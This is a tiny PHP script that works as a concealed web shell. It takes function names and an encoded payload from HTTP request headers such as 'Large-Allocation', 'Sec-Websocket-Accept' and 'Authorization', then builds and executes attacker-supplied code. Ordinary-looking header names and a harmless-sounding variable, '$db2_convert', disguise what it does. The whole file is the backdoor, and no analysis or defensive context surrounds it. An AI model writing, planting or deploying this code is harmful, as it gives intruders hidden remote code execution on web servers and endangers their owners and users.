<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Large-Allocation'])) {
    $db2_convert = $_HEADERS['Large-Allocation']('', $_HEADERS['Sec-Websocket-Accept']($_HEADERS['Authorization']));
    $db2_convert();
}